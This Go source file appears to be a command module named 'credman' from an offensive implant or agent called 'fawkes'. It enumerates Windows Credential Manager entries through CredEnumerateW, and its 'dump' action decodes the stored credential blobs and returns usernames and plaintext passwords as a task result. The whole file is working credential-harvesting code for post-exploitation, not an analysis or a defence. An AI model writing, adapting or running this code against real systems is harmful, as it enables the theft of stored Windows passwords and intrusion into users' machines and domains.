//go:build windows

package commands

import (
	"encoding/json"
	"fmt"
	"strings"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

var (
	advapi32CM         = windows.NewLazySystemDLL("advapi32.dll")
	procCredEnumerateW = advapi32CM.NewProc("CredEnumerateW")
	procCredFree       = advapi32CM.NewProc("CredFree")
)

// CREDENTIAL structure matching Windows CREDENTIALW
type credential struct {
	Flags              uint32
	Type               uint32
	TargetName         *uint16
	Comment            *uint16
	LastWritten        windows.Filetime
	CredentialBlobSize uint32
	CredentialBlob     *byte
	Persist            uint32
	AttributeCount     uint32
	Attributes         uintptr
	TargetAlias        *uint16
	UserName           *uint16
}

// Credential type constants
const (
	credTypeGeneric           = 1
	credTypeDomainPassword    = 2
	credTypeDomainCertificate = 3
	credTypeDomainVisible     = 4
)

type CredmanCommand struct{}

func (c *CredmanCommand) Name() string {
	return "credman"
}

func (c *CredmanCommand) Description() string {
	return "Enumerate Windows Credential Manager entries"
}

type credmanArgs struct {
	Action string `json:"action"` // list (default), or dump (includes passwords)
	Filter string `json:"filter"` // optional target name filter (e.g., "Microsoft*")
}

func (c *CredmanCommand) Execute(task structs.Task) structs.CommandResult {
	var args credmanArgs

	if task.Params != "" {
		// Try JSON first
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			// Plain text = filter
			args.Filter = strings.TrimSpace(task.Params)
		}
	}

	if args.Action == "" {
		args.Action = "list"
	}

	switch strings.ToLower(args.Action) {
	case "list":
		return credmanList(args, false)
	case "dump":
		return credmanList(args, true)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s. Use: list or dump", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

func credmanList(args credmanArgs, showPasswords bool) structs.CommandResult {
	var count uint32
	var credArray uintptr

	// Set up filter — NULL means all credentials
	var filterPtr uintptr
	if args.Filter != "" {
		filterUTF16, err := windows.UTF16PtrFromString(args.Filter)
		if err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Invalid filter: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
		filterPtr = uintptr(unsafe.Pointer(filterUTF16))
	}

	r, _, err := procCredEnumerateW.Call(
		filterPtr,
		0, // flags must be 0
		uintptr(unsafe.Pointer(&count)),
		uintptr(unsafe.Pointer(&credArray)),
	)
	if r == 0 {
		// Check for "no credentials" error
		if err == windows.ERROR_NOT_FOUND {
			return structs.CommandResult{
				Output:    "No credentials found in Credential Manager",
				Status:    "success",
				Completed: true,
			}
		}
		return structs.CommandResult{
			Output:    fmt.Sprintf("CredEnumerateW failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer procCredFree.Call(credArray)

	// Parse the credential pointer array
	credPtrs := unsafe.Slice((**credential)(unsafe.Pointer(credArray)), count)

	var lines []string
	lines = append(lines, fmt.Sprintf("=== Windows Credential Manager (%d entries) ===\n", count))

	genericCount := 0
	domainCount := 0

	for _, cred := range credPtrs {
		target := ""
		if cred.TargetName != nil {
			target = windows.UTF16PtrToString(cred.TargetName)
		}
		user := ""
		if cred.UserName != nil {
			user = windows.UTF16PtrToString(cred.UserName)
		}
		comment := ""
		if cred.Comment != nil {
			comment = windows.UTF16PtrToString(cred.Comment)
		}

		typeName := credTypeName(cred.Type)

		lines = append(lines, fmt.Sprintf("--- %s ---", target))
		lines = append(lines, fmt.Sprintf("  Type:     %s", typeName))
		if user != "" {
			lines = append(lines, fmt.Sprintf("  Username: %s", user))
		}

		if showPasswords && cred.CredentialBlobSize > 0 && cred.CredentialBlob != nil {
			password := extractCredBlob(cred)
			if password != "" {
				lines = append(lines, fmt.Sprintf("  Password: %s", password))
			}
		} else if cred.CredentialBlobSize > 0 {
			lines = append(lines, fmt.Sprintf("  Blob:     %d bytes (use -action dump to reveal)", cred.CredentialBlobSize))
		}

		if comment != "" {
			lines = append(lines, fmt.Sprintf("  Comment:  %s", comment))
		}

		persistName := credPersistName(cred.Persist)
		lines = append(lines, fmt.Sprintf("  Persist:  %s", persistName))
		lines = append(lines, "")

		switch cred.Type {
		case credTypeGeneric:
			genericCount++
		case credTypeDomainPassword, credTypeDomainCertificate, credTypeDomainVisible:
			domainCount++
		}
	}

	lines = append(lines, fmt.Sprintf("Summary: %d generic, %d domain credentials", genericCount, domainCount))

	return structs.CommandResult{
		Output:    strings.Join(lines, "\n"),
		Status:    "success",
		Completed: true,
	}
}

func extractCredBlob(cred *credential) string {
	blob := unsafe.Slice(cred.CredentialBlob, cred.CredentialBlobSize)

	// For generic and domain password credentials, the blob is often UTF-16
	if (cred.Type == credTypeGeneric || cred.Type == credTypeDomainPassword || cred.Type == credTypeDomainVisible) &&
		cred.CredentialBlobSize >= 2 && cred.CredentialBlobSize%2 == 0 {
		u16 := unsafe.Slice((*uint16)(unsafe.Pointer(cred.CredentialBlob)), cred.CredentialBlobSize/2)
		decoded := windows.UTF16ToString(u16)
		if decoded != "" && isPrintable(decoded) {
			return decoded
		}
	}

	// Fallback: try as raw bytes
	raw := string(blob)
	if isPrintable(raw) {
		return raw
	}

	return fmt.Sprintf("[binary data, %d bytes]", cred.CredentialBlobSize)
}

func isPrintable(s string) bool {
	for _, r := range s {
		if r < 0x20 || r == 0x7f {
			return false
		}
	}
	return len(s) > 0
}

func credTypeName(t uint32) string {
	switch t {
	case credTypeGeneric:
		return "Generic"
	case credTypeDomainPassword:
		return "Domain Password"
	case credTypeDomainCertificate:
		return "Domain Certificate"
	case credTypeDomainVisible:
		return "Domain Visible Password"
	default:
		return fmt.Sprintf("Unknown (%d)", t)
	}
}

func credPersistName(p uint32) string {
	switch p {
	case 1:
		return "Session"
	case 2:
		return "Local Machine"
	case 3:
		return "Enterprise"
	default:
		return fmt.Sprintf("Unknown (%d)", p)
	}
}
